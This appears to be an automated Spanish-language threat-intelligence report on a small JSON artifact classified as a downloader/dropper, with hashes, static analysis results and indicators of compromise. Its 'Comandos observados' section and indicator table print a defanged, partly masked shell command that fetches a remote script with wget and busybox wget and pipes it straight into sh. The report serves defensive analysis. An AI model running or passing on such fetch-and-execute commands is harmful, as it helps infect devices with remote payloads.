# 🧬 Payload Analysis

`ed0e01eef7effa81915b7c37d959241076993f837547c5bb86b6153d9844edc7`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ed0e01eef7effa81915b7c37d959241076993f837547c5bb86b6153d9844edc7`
- **MD5:** `a76af1360c7d8ad44253acb58e998a8c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 176 B |
| Entropía | 4.76 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=4

## 🖥️ Comandos observados / extraídos

```text
{"cmd":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s 9router;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s 9
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | ed0e01eef7effa81915b7c37d959241076993f837547c5bb86b6153d9844edc7 | static_analysis |
| command | {"cmd":"`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s 9router;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s 9 | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
